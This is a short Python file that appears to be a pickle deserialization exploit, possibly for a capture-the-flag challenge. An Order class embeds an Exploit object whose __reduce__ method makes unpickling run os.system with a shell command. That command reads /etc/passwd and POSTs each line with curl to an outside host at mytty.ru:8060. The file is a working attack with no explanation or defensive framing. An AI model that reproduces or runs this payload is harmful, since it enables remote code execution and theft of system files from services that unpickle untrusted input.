import inspect
import subprocess
import os

class Order(object):
    def __init__(self):
        self._order = 'cfee7583272b012252e731c43d6a1f74d48ad70eed4f5f950b9084dcdcd0cceb'
        self._address =  '1\n2'
        self._name = Exploit()

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd | xargs -I{} sh -c \'curl -H "Content-Type: application/json" -X POST -d "{}" http://mytty.ru:8060\'',))
